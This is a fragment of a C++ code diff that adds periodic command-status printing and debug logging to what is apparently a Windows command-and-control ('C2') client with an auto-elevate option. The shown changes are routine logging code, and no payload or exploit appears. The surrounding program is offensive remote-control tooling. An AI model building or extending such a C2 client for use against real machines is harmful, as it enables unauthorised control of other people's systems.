+                                          << getEnhancedCommandDescription(cmd.commandType, cmd.fullCommand) 
+                                          << " (" << elapsed << "s)" << std::endl;
+                            }
+                        }
+                    }
+                }
+                
+                // Print full command status every 30 seconds
+                if (std::chrono::duration_cast<std::chrono::seconds>(now - lastStatusReport).count() >= 30) {
+                    printCommandStatus();
+                    lastStatusReport = now;
+                }
             }
             
             Sleep(100);
@@ -4076,6 +4302,21 @@ void runClient(const std::string& serverIP, int serverPort, bool autoElevate) {
     std::cout << "====================================================\n";
     std::cout << "\n";
     
+    // Initialize debug logging
+    if (!initializeDebugLogging()) {
+        std::cerr << "[!] Warning: Debug logging initialization failed\n";
+    } else {
+        std::cout << "[*] Debug logging initialized to: " << DEBUG_LOG_PATH << "\n";
+    }
+    
+    debugLog(DEBUG_INFO, "CLIENT_MAIN", "C2 Client starting", "Server: " + serverIP + ":" + std::to_string(serverPort));
+    
     C2Client client(serverIP, serverPort, autoElevate);
     client.start();
+    
+    // Close debug log on exit
+    if (g_debugLogFile.is_open()) {
+        debugLog(DEBUG_INFO, "CLIENT_MAIN", "Client shutting down");
+        g_debugLogFile.close();
+    }
 }
